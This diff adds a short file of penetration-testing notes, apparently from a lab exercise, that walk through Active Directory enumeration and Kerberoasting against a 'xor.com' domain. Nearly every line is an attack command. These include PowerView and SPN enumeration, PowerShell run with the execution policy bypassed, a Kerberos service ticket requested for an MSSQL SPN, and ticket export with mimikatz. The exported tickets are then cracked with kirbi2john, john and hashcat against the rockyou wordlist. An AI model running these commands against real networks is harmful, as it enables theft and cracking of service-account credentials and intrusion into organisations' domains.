@@ -1,0 +1,49 @@
+import-module powerview.ps1
+
+* Get-DmainUser - get domain users
+Get-DomainComputer
+
+Get-NetLoggedon -ComputerName client251
+Get-NetSession -ComputerName dc01
+
+
+import-module .\GetSPN.ps1
+
+get-spn -type service -search *xor.com*
+* get-spn -type group -search "Domain Admins"
+
+
+
+spn_enum2.ps1 - > get spns (update domain name)
+user_enum.ps1  -> lists domain users
+
+powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File ldp.ps1
+
+klist - no ticket
+
+Requesting ticket for sqlserver SPN:
+
+Add-Type -AssemblyName System.IdentityModel
+New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'MSSQLSvc/xor-app23.xor.com:1433'
+
+list ticket and export and crack
+
+kerberos::list /export
+
+python /usr/share/john/kirbi2john.py '2-40a10000-xor-app59$@MSSQLSvc~xor-app23.xor.com~1433-XOR.COM.kirbi' > crack
+
+john --format=krb5tgs ./crack --wordlist=/usr/share/wordlists/rockyou.txt 
+
+xor23 mimikatz error. mimikatz 2.1.1 works.
+
+
+Import-module Invoke-Kerberoast.ps1
+
+Invoke-Kerberoast -OutputFormat HashCat|Select-Object -ExpandProperty hash | out-file -Encoding ASCII kerb-Hash0.txt
+hashcat -m 13100 -a 0 ./kerb-Hash0.txt /usr/share/wordlists/rockyou.txt --force --show 
+
+
+Try to run mimikatz with domain user login.
+
+https://adsecurity.org/?p=2011
+
